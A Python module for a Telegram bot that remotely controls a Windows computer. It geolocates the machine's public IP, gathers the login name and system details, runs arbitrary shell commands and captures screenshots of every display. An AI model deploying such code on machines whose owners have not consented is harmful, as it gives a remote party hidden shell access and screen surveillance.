import aiohttp, os, pyautogui, psutil, subprocess, asyncio
from aiogram import Bot
from platform import uname
from shutil import disk_usage
from desktopmagic.screengrab_win32 import getDisplaysAsImages


class WindowsMachine:
    def __init__(self, bot: Bot) -> None:
        self.bot = bot

    async def update(self) -> bool:
        self.ip = {'ip': 'Неизвестно', 'city': 'Неизвестно', 'region': 'Неизвестно', 'country': 'Неизвестно', 'org': 'Неизвестно'}

        async with aiohttp.ClientSession() as session:
            async with session.get("https://ipinfo.io/ip") as response:
                if response.status == 200:
                    self.ip.update({"ip": await response.text()})

            async with session.get(f"https://ipinfo.io/widget/demo/{self.ip['ip']}") as response:
                if response.status == 200:
                    info = (await response.json())['data']
                    self.ip.update(info)

        self.total_mem, self.used_mem, self.free_mem = disk_usage('.')
        
        self.login = os.getlogin()
        self.width, self.height = pyautogui.size()
        self.oper = uname()
        try: self.virtual_memory = psutil.virtual_memory()
        except: self.virtual_memory = 'нет информации'

        try: self.battery = f"{psutil.sensors_battery()[0]}%"
        except: self.battery = 'нет информации'

        return True
    

    async def console_cmd(self, cmd: str) -> dict:
        process = await asyncio.create_subprocess_shell(
            cmd.strip(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await process.communicate()
        return stdout.decode('cp866').strip() + stderr.decode('cp866').strip()
    

    async def screenshot(self) -> str:
        screenshots_raw = getDisplaysAsImages()
        screenshots = []

        for i in range(0, len(screenshots_raw)):
            screenshot_name = f"screenshot{i}.png"
            screenshots_raw[i].save(screenshot_name)
            screenshots.append(screenshot_name)

        return screenshots
